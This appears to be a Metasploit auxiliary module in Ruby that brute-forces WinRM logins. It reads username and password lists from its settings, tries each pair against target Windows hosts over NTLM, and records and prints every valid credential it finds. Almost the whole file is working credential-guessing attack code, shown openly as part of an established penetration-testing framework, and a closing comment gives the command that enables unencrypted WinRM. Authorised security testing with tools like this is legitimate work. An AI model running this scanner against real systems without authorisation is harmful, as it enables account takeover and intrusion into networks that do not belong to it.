##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'rex/proto/ntlm/message'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner'
require 'metasploit/framework/login_scanner/winrm'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::WinRM
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'WinRM Login Utility',
      'Description'    => %q{
        This module attempts to authenticate to a WinRM service. It currently
        works only if the remote end allows Negotiate(NTLM) authentication.
        Kerberos is not currently supported.  Please note: in order to use this
        module without SSL, the 'AllowUnencrypted' winrm option must be set.
        Otherwise adjust the port and set the SSL options in the module as appropriate.
      },
      'Author'         => [ 'thelightcosine' ],
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'        => MSF_LICENSE
    )

  end


  def run_host(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS'],
      realm: datastore['DOMAIN'],
    )
    scanner = Metasploit::Framework::LoginScanner::WinRM.new(
      host: ip,
      port: rport,
      proxies: datastore["PROXIES"],
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      connection_timeout: 10,
    )
    scanner.scan! do |result|
      if result.success?
        cred_hash = {
          :host        => ip,
          :port        => rport,
          :sname       => 'winrm',
          :pass        => result.credential.private,
          :user        => result.credential.public,
          :source_type => "user_supplied",
          :active      => true
        }
        report_auth_info(cred_hash)
        print_good "#{ip}:#{rport}: Valid credential found: #{result.credential}"
      else
        vprint_status "#{ip}:#{rport}: Login failed: #{result.credential}"
      end
    end
  end


  def test_request
    return winrm_wql_msg("Select Name,Status from Win32_Service")
  end

end

=begin
To set the AllowUncrypted option:
winrm set winrm/config/service @{AllowUnencrypted="true"}
=end
